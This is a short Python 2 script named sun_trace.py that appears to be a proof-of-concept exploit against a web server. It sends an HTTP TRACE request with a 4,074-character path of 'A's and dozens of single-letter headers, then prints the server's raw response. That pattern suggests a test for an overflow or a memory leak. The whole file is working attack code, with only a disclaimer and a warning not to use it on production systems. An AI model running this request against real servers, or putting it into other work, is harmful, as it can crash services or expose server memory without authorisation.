#!/usr/bin/env python
# sun_trace.py
#
# Use this code at your own risk. Never run it against a production system.
# 
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import socket
import sys

def send_req(host,port):
  buf="TRACE /%s HTTP/1.0\n" % ("A"*4074) 
  for i in range(0,10):
    buf += "%d"%i + ":\n"
                               
  for i in range(ord('a'), ord('z')):
    buf += chr(i) + ":\n"

  buf += "\n" 

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((host,port))
  sock.sendall(buf)
  resp=""
  while 1:
    s= sock.recv(4000)
    if len(s)<1: break
    resp+=s
  print list(resp)

if __name__=="__main__":
 if len(sys.argv)<3:
  print "usage: %s host port" % sys.argv[0]
  sys.exit()

 send_req(sys.argv[1],int(sys.argv[2]))
